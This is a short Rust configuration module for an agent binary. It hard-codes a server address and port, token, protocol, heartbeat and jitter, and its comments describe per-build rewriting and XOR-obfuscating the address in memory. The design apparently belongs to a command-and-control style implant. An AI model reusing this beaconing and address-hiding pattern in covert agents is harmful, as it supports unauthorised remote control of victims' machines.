//! Embedded server connection profile.
//!
//! **Build-flow integration:** the server-side agent build process
//! (`server/src/kernel/service/agent_builds/build.rs`) temporarily rewrites
//! this file with the target deployment address and token, compiles the
//! agent binary, then restores the workspace copy. The values below are
//! development defaults only — they are replaced at compile time for
//! production builds.
//!
//! `Config::load()` in `protocol/config.rs` wraps the address through
//! `SecureServerAddr` so it lives XOR-encrypted on the heap at runtime
//! and is zeroed on drop.

const EMBEDDED_SERVER_ADDR: &str = "82.157.147.224:1234";
const EMBEDDED_AGENT_TOKEN: Option<&str> = None;
const EMBEDDED_PROTOCOL: &str = "tcp";
const EMBEDDED_HEARTBEAT_SECS: u64 = 15;
const EMBEDDED_JITTER: u32 = 0;

pub fn get_server_addr() -> String {
    EMBEDDED_SERVER_ADDR.to_string()
}

pub fn get_agent_token() -> Option<String> {
    EMBEDDED_AGENT_TOKEN.map(str::to_string)
}

pub fn get_protocol() -> &'static str {
    EMBEDDED_PROTOCOL
}

pub fn get_heartbeat_secs() -> u64 {
    EMBEDDED_HEARTBEAT_SECS
}

pub fn get_jitter() -> u32 {
    EMBEDDED_JITTER
}
